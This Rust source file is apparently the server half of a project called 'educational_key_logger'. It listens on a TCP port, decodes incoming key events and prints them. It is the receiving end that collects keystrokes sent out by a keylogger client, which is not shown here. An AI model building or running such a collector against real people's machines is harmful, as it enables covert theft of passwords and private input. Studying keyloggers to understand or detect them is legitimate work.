use educational_key_logger::IP_PORT;
use educational_key_logger::input::InputEvent;
use std::io::Read;
use std::net::{TcpListener, TcpStream};

fn main() {
    let listener = TcpListener::bind(IP_PORT).unwrap();
    for stream in listener.incoming() {
        handle_stream(stream.unwrap());
    }
}

fn handle_stream(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Client disconnected");
                break;
            }
            Ok(bytes_read) => {
                handle_stream_read(&buffer[..bytes_read]);
            }
            Err(e) => {
                println!("Read error: {}", e);
                break;
            }
        }
    }
}

fn handle_stream_read(buffer: &[u8]) {
    let key_event: InputEvent = postcard::from_bytes(&buffer).unwrap();
    dbg!(key_event);
}
